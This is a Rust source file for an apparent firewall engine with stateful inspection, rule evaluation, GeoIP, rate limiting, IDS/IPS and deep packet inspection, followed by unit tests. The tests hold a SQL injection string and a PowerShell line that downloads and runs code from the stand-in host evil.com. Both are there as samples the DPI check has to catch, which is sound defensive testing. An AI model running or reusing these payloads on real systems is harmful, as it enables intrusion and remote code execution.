// firewallx/src/modules/engine.rs
// Core FirewallEngine: stateful inspection + rule evaluation + DPI + IDS/IPS.

use crate::modules::dpi::DpiEngine;
use crate::modules::ids::{IdsEngine, IdsConfig};
use crate::modules::logger::FirewallLogger;
use crate::modules::packet::Packet;
use crate::modules::rule::{Action, RuleSet};
use crate::modules::state::StateTable;
use crate::modules::blocklist::BlocklistManager;
use crate::modules::rate_limiter::RateLimiter;
use crate::modules::qos::QosManager;
use crate::modules::packet::QosPriority;
use crate::modules::siem::{SiemLogger, SiemEvent};
use maxminddb::geoip2;
use prometheus_exporter::prometheus::{IntCounter, IntCounterVec, IntGauge, register_int_counter, register_int_counter_vec, register_int_gauge, opts};
use lazy_static::lazy_static;

lazy_static! {
    static ref PACKETS_TOTAL: IntCounter = register_int_counter!(opts!("firewallx_packets_total", "Total number of packets processed by the engine")).unwrap();
    static ref PACKETS_DROPPED: IntCounterVec = register_int_counter_vec!("firewallx_packets_dropped_total", "Total packets dropped, labelled by reason", &["reason"]).unwrap();
    static ref ACTIVE_CONNECTIONS: IntGauge = register_int_gauge!(opts!("firewallx_active_connections", "Number of currently active connections in the state table")).unwrap();
}

/// The verdict returned for every packet.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum Decision {
    Allow,
    Drop,
    Reject,
    /// Dropped by DPI (payload threat detected).
    DpiBlock,
    /// Dropped by IDS/IPS (behavioural / rate-based threat).
    IpsBlock,
}

/// Running counters for processed packets.
#[derive(Debug, Default, Clone)]
pub struct Stats {
    pub total: u64,
    pub allowed: u64,
    pub dropped: u64,
    pub rejected: u64,
    pub dpi_blocked: u64,
    pub ips_blocked: u64,
    pub rate_limited: u64,
    pub qos_dropped: u64,
}

/// Engine feature flags — toggle subsystems at runtime.
#[derive(Debug, Clone)]
pub struct EngineConfig {
    pub dpi_enabled: bool,
    pub ids_enabled: bool,
}

impl Default for EngineConfig {
    fn default() -> Self {
        Self { dpi_enabled: true, ids_enabled: true }
    }
}

/// The main firewall engine.
pub struct FirewallEngine {
    ruleset: RuleSet,
    state_table: StateTable,
    logger: FirewallLogger,
    dpi: DpiEngine,
    ids: IdsEngine,
    config: EngineConfig,
    stats: Stats,
    pub geo_db: Option<maxminddb::Reader<Vec<u8>>>,
    pub blocklist: BlocklistManager,
    pub active_blocks: std::collections::HashSet<std::net::Ipv4Addr>,
    pub rate_limiter: Option<RateLimiter>,
    pub qos_manager: Option<QosManager>,
    pub siem: Option<SiemLogger>,
}

impl FirewallEngine {
    /// Construct a new engine with the provided rule set and default config.
    pub fn new(ruleset: RuleSet) -> Self {
        Self {
            ruleset,
            state_table: StateTable::new(65_536),
            logger: FirewallLogger::new(),
            dpi: DpiEngine::new(),
            ids: IdsEngine::new(IdsConfig::default()),
            config: EngineConfig::default(),
            stats: Stats::default(),
            geo_db: None,
            blocklist: BlocklistManager::new(),
            active_blocks: std::collections::HashSet::new(),
            rate_limiter: None,
            qos_manager: None,
            siem: None,
        }
    }

    /// Construct with explicit feature flags and custom IDS config.
    pub fn with_config(ruleset: RuleSet, config: EngineConfig, ids_config: IdsConfig) -> Self {
        Self {
            ruleset,
            state_table: StateTable::new(65_536),
            logger: FirewallLogger::new(),
            dpi: DpiEngine::new(),
            ids: IdsEngine::new(ids_config),
            config,
            stats: Stats::default(),
            geo_db: None,
            blocklist: BlocklistManager::new(),
            active_blocks: std::collections::HashSet::new(),
            rate_limiter: None,
            qos_manager: None,
            siem: None,
        }
    }

    /// Process a single packet (header-only; no payload bytes) and return a verdict.
    ///
    /// Full pipeline:
    ///   1. IDS/IPS — rate-based and behavioural checks on the header.
    ///   2. State table — fast-path for established sessions.
    ///   3. Rule set — priority-ordered policy evaluation.
    ///   4. Default deny if no rule matched.
    ///   5. Insert into state table on Allow.
    ///   6. Log + update stats.
    pub fn process(&mut self, pkt: &mut Packet) -> Decision {
        self.stats.total += 1;
        PACKETS_TOTAL.inc();

        // ── Step -1: Userspace Blocklist Enforcement ────────────────
        if self.active_blocks.contains(&pkt.src_ip) {
            self.stats.dropped += 1;
            PACKETS_DROPPED.with_label_values(&["blocklist"]).inc();
            if let Some(ref siem) = self.siem {
                siem.log(SiemEvent::new("BLOCKLIST", &pkt.src_ip.to_string(), &pkt.dst_ip.to_string(), pkt.dst_port, &pkt.protocol.to_string(), "Malicious IP found in feeds", "Drop"));
            }
            return Decision::Drop;
        }

        // ── Step 0: GeoIP Lookup ──────────────────────────────
        if pkt.country.is_none() {
            if let Some(ref db) = self.geo_db {
                if let Ok(country) = db.lookup::<geoip2::Country>(std::net::IpAddr::V4(pkt.src_ip)) {
                    if let Some(c) = country.country {
                        if let Some(iso_code) = c.iso_code {
                            pkt.country = Some(iso_code.to_string());
                        }
                    }
                }
            }
        }

        // ── Step 0.3: Rate Limiting & Fail2Ban ──────────────────────
        if let Some(ref mut limit) = self.rate_limiter {
            if limit.check(pkt.src_ip) {
                self.stats.rate_limited += 1;
                PACKETS_DROPPED.with_label_values(&["rate_limit"]).inc();
                if let Some(ref siem) = self.siem {
                    siem.log(SiemEvent::new("RATE_LIMIT", &pkt.src_ip.to_string(), &pkt.dst_ip.to_string(), pkt.dst_port, &pkt.protocol.to_string(), "IP exceeded connection limits", "Drop"));
                }
                return Decision::Drop;
            }
        }

        // ── Step 0.5: QoS Priority Assignment & Classification ──────
        // If not explicitly set, auto-detect priority based on port
        if pkt.qos == QosPriority::Normal {
            match pkt.dst_port {
                22 | 51820 | 1194 => pkt.qos = QosPriority::High, // SSH, WireGuard, OpenVPN
                _ => {}
            }
        }

        if let Some(ref mut qos) = self.qos_manager {
            if qos.check(&pkt) {
                self.stats.qos_dropped += 1;
                PACKETS_DROPPED.with_label_values(&["qos"]).inc();
                return Decision::Drop; // Normal traffic dropped under heavy load
            }
        }

        // ── Step 1: IDS/IPS (header-level) ───────────────────
        if self.config.ids_enabled {
            let alerts = self.ids.inspect(pkt);
            if !alerts.is_empty() {
                if let Some(ref siem) = self.siem {
                    for a in &alerts {
                        siem.log(SiemEvent::new("IDS_ALERT", &pkt.src_ip.to_string(), &pkt.dst_ip.to_string(), pkt.dst_port, &pkt.protocol.to_string(), &a.description, if a.block { "Drop" } else { "Alert" }));
                    }
                }
            }
            if alerts.iter().any(|a| a.block) {
                self.stats.ips_blocked += 1;
                PACKETS_DROPPED.with_label_values(&["ids"]).inc();
                return Decision::IpsBlock;
            }
        }

        // ── Step 2: stateful fast-path ────────────────────────
        if self.state_table.lookup(pkt) {
            self.stats.allowed += 1;
            self.logger.log_allow(pkt, "stateful");
            return Decision::Allow;
        }

        // ── Step 3: rule evaluation ───────────────────────────
        let decision = match self.ruleset.evaluate(pkt) {
            Some(rule) => {
                self.logger.log_rule_hit(pkt, rule);
                match rule.action {
                    Action::Allow  => Decision::Allow,
                    Action::Drop   => {
                        PACKETS_DROPPED.with_label_values(&["rule"]).inc();
                        Decision::Drop
                    },
                    Action::Reject => {
                        PACKETS_DROPPED.with_label_values(&["rule"]).inc();
                        self.ids.record_reject(pkt.src_ip);
                        Decision::Reject
                    }
                }
            }
            // ── Step 4: default deny ──────────────────────────
            None => {
                self.logger.log_default_deny(pkt);
                PACKETS_DROPPED.with_label_values(&["default_deny"]).inc();
                Decision::Drop
            }
        };

        // ── Step 5: state table insert on Allow ───────────────
        if decision == Decision::Allow {
            self.state_table.insert(pkt);
        }

        // ── Step 6: stats ─────────────────────────────────────
        match &decision {
            Decision::Allow  => self.stats.allowed  += 1,
            Decision::Drop   => self.stats.dropped  += 1,
            Decision::Reject => self.stats.rejected += 1,
            _                => {}
        }

        decision
    }

    /// Process a packet with a payload for DPI inspection.
    /// Runs the full pipeline then additionally inspects the payload bytes.
    /// Returns `Decision::DpiBlock` if the DPI engine finds a threat.
    pub fn process_with_payload(&mut self, pkt: &mut Packet, payload: &[u8]) -> Decision {
        // Header-level decision first
        let header_decision = self.process(pkt);
        if header_decision != Decision::Allow {
            return header_decision;
        }

        // DPI on the payload
        if self.config.dpi_enabled {
            let dpi_result = self.dpi.inspect(payload);
            if dpi_result.blocked {
                self.stats.dpi_blocked += 1;
                // Undo the Allow stat added in process()
                self.stats.allowed  = self.stats.allowed.saturating_sub(1);
                PACKETS_DROPPED.with_label_values(&["dpi"]).inc();

                if let Some(ref siem) = self.siem {
                    let reasons: Vec<_> = dpi_result.matches.iter().map(|m| m.sig_id.to_string()).collect();
                    let msg = format!("Payload inspection matched signatures: {}", reasons.join(","));
                    siem.log(SiemEvent::new("DPI_BLOCK", &pkt.src_ip.to_string(), &pkt.dst_ip.to_string(), pkt.dst_port, &pkt.protocol.to_string(), &msg, "Drop"));
                }
                
                return Decision::DpiBlock;
            }
        }

        Decision::Allow
    }

    // ── Accessors ─────────────────────────────────────────────

    pub fn stats(&self) -> Stats { self.stats.clone() }

    pub fn ruleset_mut(&mut self) -> &mut RuleSet { &mut self.ruleset }
    pub fn ruleset(&self) -> &RuleSet { &self.ruleset }

    pub fn state_table_mut(&mut self) -> &mut StateTable { &mut self.state_table }

    pub fn dpi_mut(&mut self) -> &mut DpiEngine { &mut self.dpi }

    pub fn ids_mut(&mut self) -> &mut IdsEngine { &mut self.ids }
    
    pub fn ids(&self) -> &IdsEngine { &self.ids }
    
    pub fn active_connections(&self) -> usize {
        self.state_table.len()
    }

    pub fn config_mut(&mut self) -> &mut EngineConfig { &mut self.config }

    pub fn blocklist_mut(&mut self) -> &mut BlocklistManager { &mut self.blocklist }
}

#[cfg(test)]
mod tests {
    use super::*;
    use std::net::Ipv4Addr;
    use crate::modules::packet::{Packet, Protocol, Direction};
    use crate::modules::rule::{Rule, Action, RuleSet};

    fn build_engine() -> FirewallEngine {
        let mut rs = RuleSet::new();
        rs.add(Rule::new(
            1, "Allow SSH", Action::Allow,
            None, None, Some(22),
            Protocol::Tcp, Direction::Inbound, None
        ));
        rs.add(Rule::new(
            2, "Block Telnet", Action::Drop,
            None, None, Some(23),
            Protocol::Tcp, Direction::Inbound, None
        ));
        FirewallEngine::new(rs)
    }

    fn pkt(dst_port: u16, dir: Direction) -> Packet {
        Packet::new(
            Ipv4Addr::new(1, 2, 3, 4),
            Ipv4Addr::new(10, 0, 0, 1),
            54000, dst_port,
            Protocol::Tcp, dir, 64
        )
    }

    #[test]
    fn test_allow_ssh() {
        let mut engine = build_engine();
        assert_eq!(engine.process(&mut pkt(22, Direction::Inbound)), Decision::Allow);
    }

    #[test]
    fn test_drop_telnet() {
        let mut engine = build_engine();
        assert_eq!(engine.process(&mut pkt(23, Direction::Inbound)), Decision::Drop);
    }

    #[test]
    fn test_default_deny_unknown_port() {
        let mut engine = build_engine();
        assert_eq!(engine.process(&mut pkt(9999, Direction::Inbound)), Decision::Drop);
    }

    #[test]
    fn test_stateful_second_packet_allowed() {
        let mut engine = build_engine();
        let mut p = pkt(22, Direction::Inbound);
        assert_eq!(engine.process(&mut p), Decision::Allow);
        // Same packet again — should take the stateful fast-path
        assert_eq!(engine.process(&mut p), Decision::Allow);
        assert_eq!(engine.stats().allowed, 2);
    }

    #[test]
    fn test_stats_tracking() {
        let mut engine = build_engine();
        engine.process(&mut pkt(22, Direction::Inbound)); // allowed
        engine.process(&mut pkt(23, Direction::Inbound)); // dropped
        engine.process(&mut pkt(9999, Direction::Inbound)); // dropped (default)
        let s = engine.stats();
        assert_eq!(s.total,   3);
        assert_eq!(s.allowed, 1);
        assert_eq!(s.dropped, 2);
    }

    #[test]
    fn test_geo_ip_blocking() {
        let mut rs = RuleSet::new();
        // Drop traffic from RU or CN
        rs.add(Rule::new(
            1, "Drop RU/CN", Action::Drop,
            None, None, None,
            Protocol::Any, Direction::Inbound, 
            Some(vec!["RU".to_string(), "CN".to_string()])
        ));
        rs.add(Rule::new(
            2, "Allow All", Action::Allow,
            None, None, None,
            Protocol::Any, Direction::Inbound, None
        ));
        let mut engine = FirewallEngine::new(rs);

        let mut pkt_ru = pkt(80, Direction::Inbound);
        pkt_ru.country = Some("RU".to_string());

        let mut pkt_us = pkt(80, Direction::Inbound);
        pkt_us.country = Some("US".to_string());

        let mut pkt_none = pkt(80, Direction::Inbound);

        assert_eq!(engine.process(&mut pkt_ru), Decision::Drop);
        assert_eq!(engine.process(&mut pkt_us), Decision::Allow);
        assert_eq!(engine.process(&mut pkt_none), Decision::Allow); 
    }
}

#[cfg(test)]
mod tests_advanced {
    use super::*;
    use std::net::Ipv4Addr;
    use crate::modules::packet::{Packet, Protocol, Direction};
    use crate::modules::rule::{Rule, Action, RuleSet};
    use crate::modules::ids::IdsConfig;
    use std::time::Duration;

    fn build_engine() -> FirewallEngine {
        let mut rs = RuleSet::new();
        rs.add(Rule::new(1, "Allow SSH",    Action::Allow, None, None, Some(22), Protocol::Tcp, Direction::Inbound, None));
        rs.add(Rule::new(2, "Block Telnet", Action::Drop,  None, None, Some(23), Protocol::Tcp, Direction::Inbound, None));
        FirewallEngine::new(rs)
    }

    fn pkt(dst_port: u16, dir: Direction) -> Packet {
        Packet::new(Ipv4Addr::new(1,2,3,4), Ipv4Addr::new(10,0,0,1), 54000, dst_port, Protocol::Tcp, dir, 64)
    }

    #[test]
    fn test_allow_ssh()              { assert_eq!(build_engine().process(&mut pkt(22, Direction::Inbound)),  Decision::Allow); }
    #[test]
    fn test_drop_telnet()            { assert_eq!(build_engine().process(&mut pkt(23, Direction::Inbound)),  Decision::Drop); }
    #[test]
    fn test_default_deny()           { assert_eq!(build_engine().process(&mut pkt(9999, Direction::Inbound)), Decision::Drop); }

    #[test]
    fn test_stateful_second_packet() {
        let mut e = build_engine();
        let mut p = pkt(22, Direction::Inbound);
        assert_eq!(e.process(&mut p), Decision::Allow);
        assert_eq!(e.process(&mut p), Decision::Allow);
        assert_eq!(e.stats().allowed, 2);
    }

    #[test]
    fn test_dpi_blocks_malicious_payload() {
        let mut e = build_engine();
        let mut p = pkt(22, Direction::Inbound);
        // SQL injection payload
        let payload = b"GET /login?id=' OR '1'='1 HTTP/1.1";
        // First allow via header (port 22), then DPI blocks it
        let verdict = e.process_with_payload(&mut p, payload);
        assert_eq!(verdict, Decision::DpiBlock);
        assert_eq!(e.stats().dpi_blocked, 1);
    }

    #[test]
    fn test_dpi_clean_payload_allowed() {
        let mut e = build_engine();
        let mut p = pkt(22, Direction::Inbound);
        let clean_payload = b"SSH-2.0-OpenSSH_8.9p1";
        let verdict = e.process_with_payload(&mut p, clean_payload);
        assert_eq!(verdict, Decision::Allow);
    }

    #[test]
    fn test_ids_port_scan_triggers_ips_block() {
        let mut cfg = IdsConfig::default();
        cfg.ips_mode = true;
        cfg.port_scan_threshold = 5;
        cfg.window = Duration::from_secs(60);

        let mut rs = RuleSet::new();
        rs.add(Rule::new(1, "Allow all inbound", Action::Allow, None, None, None, Protocol::Tcp, Direction::Inbound, None));
        let mut engine = FirewallEngine::with_config(rs, EngineConfig::default(), cfg);

        let attacker = Ipv4Addr::new(9, 9, 9, 9);
        // Probe 6 different ports to trigger the scan detector
        for port in 100..106u16 {
            let mut p = Packet::new(attacker, Ipv4Addr::new(10,0,0,1), 1000, port, Protocol::Tcp, Direction::Inbound, 0);
            engine.process(&mut p);
        }
        // Next packet should be IPS-blocked
        let mut p = Packet::new(attacker, Ipv4Addr::new(10,0,0,1), 1000, 443, Protocol::Tcp, Direction::Inbound, 0);
        assert_eq!(engine.process(&mut p), Decision::IpsBlock);
    }

    #[test]
    fn test_dpi_can_be_disabled() {
        let cfg = EngineConfig { dpi_enabled: false, ids_enabled: true };
        let mut rs = RuleSet::new();
        rs.add(Rule::new(1, "Allow all", Action::Allow, None, None, None, Protocol::Tcp, Direction::Inbound, None));
        let mut engine = FirewallEngine::with_config(rs, cfg, IdsConfig::default());
        let mut p = pkt(80, Direction::Inbound);
        let malicious = b"IEX(New-Object Net.WebClient).DownloadString('http://evil.com')";
        // DPI is off → should be allowed despite malicious payload
        assert_eq!(engine.process_with_payload(&mut p, malicious), Decision::Allow);
    }

    #[test]
    fn test_stats_all_categories() {
        let mut e = build_engine();
        e.process(&mut pkt(22,   Direction::Inbound)); // allow
        e.process(&mut pkt(23,   Direction::Inbound)); // drop
        e.process(&mut pkt(9999, Direction::Inbound)); // drop (default deny)
        let s = e.stats();
        assert_eq!(s.total,   3);
        assert_eq!(s.allowed, 1);
        assert_eq!(s.dropped, 2);
    }
}
